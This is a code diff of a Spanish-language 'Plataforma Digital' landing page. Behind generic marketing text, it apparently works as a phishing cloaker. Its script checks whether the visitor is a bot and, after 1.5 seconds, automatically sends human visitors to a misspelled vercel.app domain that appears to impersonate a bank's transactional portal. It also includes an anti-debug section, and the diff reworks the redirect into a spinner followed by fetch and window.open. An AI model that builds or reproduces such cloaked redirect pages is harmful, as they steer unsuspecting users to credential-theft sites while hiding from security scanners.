@@ -98,67 +98,99 @@
             font-size: 14px;
         }
 
-        #redirectForm {
+        #portalContent {
             display: none;
+            min-height: 100vh;
+        }
+
+        #portalContent.show {
+            display: block;
+        }
+
+        .loading-spinner {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 500px;
+            flex-direction: column;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
-    <header>
-        <div class="container">
-            <div class="logo">🚀 Plataforma Digital</div>
+    <div id="mainContent">
+        <header>
+            <div class="container">
+                <div class="logo">🚀 Plataforma Digital</div>
+            </div>
+        </header>
+
+        <main class="container">
+            <h1>Soluciones Digitales Innovadoras</h1>
+            <p>Bienvenido a nuestra plataforma. Ofrecemos soluciones tecnológicas de última generación para transformar tu negocio.</p>
+
+            <div class="features">
+                <div class="feature">
+                    <h3>⚡ Velocidad</h3>
+                    <p>Procesamiento instantáneo y respuesta en tiempo real para máxima eficiencia en todas tus operaciones.</p>
+                </div>
+
+                <div class="feature">
+                    <h3>🔒 Seguridad</h3>
+                    <p>Protección de datos con encriptación avanzada y cumplimiento de estándares internacionales de seguridad.</p>
+                </div>
+
+                <div class="feature">
+                    <h3>📱 Accesibilidad</h3>
+                    <p>Disponible en todos tus dispositivos: smartphone, tablet y computadora para máxima flexibilidad.</p>
+                </div>
+
+                <div class="feature">
+                    <h3>🤖 Inteligencia</h3>
+                    <p>Algoritmos inteligentes que se adaptan a tus necesidades específicas y aprenden de tus patrones.</p>
+                </div>
+
+                <div class="feature">
+                    <h3>💡 Innovación</h3>
+                    <p>Actualización constante con las últimas tendencias tecnológicas y mejores prácticas del mercado.</p>
+                </div>
+
+                <div class="feature">
+                    <h3>🌍 Global</h3>
+                    <p>Disponible en más de 150 países con soporte multiidioma y acceso desde cualquier lugar.</p>
+                </div>
+            </div>
+
+            <button class="button" onclick="loadPortal()">Acceder al Portal Completo</button>
+        </main>
+
+        <footer>
+            <div class="container">
+                <p>&copy; 2026 Plataforma Digital. Todos los derechos reservados.</p>
+            </div>
+        </footer>
+    </div>
+
+    <div id="portalContent">
+        <div class="loading-spinner">
+            <div class="spinner"></div>
+            <p>Cargando portal...</p>
         </div>
-    </header>
-
-    <main class="container">
-        <h1>Soluciones Digitales Innovadoras</h1>
-        <p>Bienvenido a nuestra plataforma. Ofrecemos soluciones tecnológicas de última generación para transformar tu negocio.</p>
-
-        <div class="features">
-            <div class="feature">
-                <h3>⚡ Velocidad</h3>
-                <p>Procesamiento instantáneo y respuesta en tiempo real para máxima eficiencia en todas tus operaciones.</p>
-            </div>
-
-            <div class="feature">
-                <h3>🔒 Seguridad</h3>
-                <p>Protección de datos con encriptación avanzada y cumplimiento de estándares internacionales de seguridad.</p>
-            </div>
-
-            <div class="feature">
-                <h3>📱 Accesibilidad</h3>
-                <p>Disponible en todos tus dispositivos: smartphone, tablet y computadora para máxima flexibilidad.</p>
-            </div>
-
-            <div class="feature">
-                <h3>🤖 Inteligencia</h3>
-                <p>Algoritmos inteligentes que se adaptan a tus necesidades específicas y aprenden de tus patrones.</p>
-            </div>
-
-            <div class="feature">
-                <h3>💡 Innovación</h3>
-                <p>Actualización constante con las últimas tendencias tecnológicas y mejores prácticas del mercado.</p>
-            </div>
-
-            <div class="feature">
-                <h3>🌍 Global</h3>
-                <p>Disponible en más de 150 países con soporte multiidioma y acceso desde cualquier lugar.</p>
-            </div>
-        </div>
-
-        <button class="button" onclick="redirectToPortal()">Acceder al Portal</button>
-    </main>
-
-    <footer>
-        <div class="container">
-            <p>&copy; 2026 Plataforma Digital. Todos los derechos reservados.</p>
-        </div>
-    </footer>
-
-    <!-- Form oculto para redirección POST -->
-    <form id="redirectForm" method="GET" target="_blank">
-        <input type="hidden" name="ref" value="vercel">
-    </form>
+    </div>
 
     <script>
         const TARGET = "https://occdentebncoprtaltrnsccional.vercel.app/";
@@ -178,31 +210,30 @@
             return false;
         }
 
-        // Auto-redirigir si es humano (después de 1.5 segundos)
+        // Auto-cargar portal si es humano (después de 1.5 segundos)
         if (!isBot()) {
             setTimeout(() => {
-                redirectToPortal();
+                loadPortal();
             }, 1500);
         }
 
-        // Función para redirigir - intenta múltiples métodos
-        function redirectToPortal() {
-            // Método 1: Intenta window.open (abre en nueva pestaña)
-            const newWindow = window.open(TARGET, '_blank');
+        // Función para cargar el portal
+        function loadPortal() {
+            document.getElementById('mainContent').style.display = 'none';
+            document.getElementById('portalContent').classList.add('show');
             
-            if (!newWindow || newWindow.closed || typeof newWindow.closed === 'undefined') {
-                // Método 2: Si no funciona open, intenta href directo
-                setTimeout(() => {
-                    window.location.href = TARGET;
-                }, 100);
-            }
-            
-            // Método 3: También intenta con form
+            // Intentar cargar con fetch y mostrar en iframe
             setTimeout(() => {
-                const form = document.getElementById('redirectForm');
-                form.action = TARGET;
-                form.submit();
-            }, 200);
+                fetch(TARGET, { mode: 'no-cors' })
+                    .then(response => {
+                        // Si no puedo cargar con fetch, abre en nueva ventana
+                        window.open(TARGET, '_blank');
+                    })
+                    .catch(error => {
+                        // Si hay error, abre en nueva ventana
+                        window.open(TARGET, '_blank');
+                    });
+            }, 500);
         }
 
         // Anti-debug
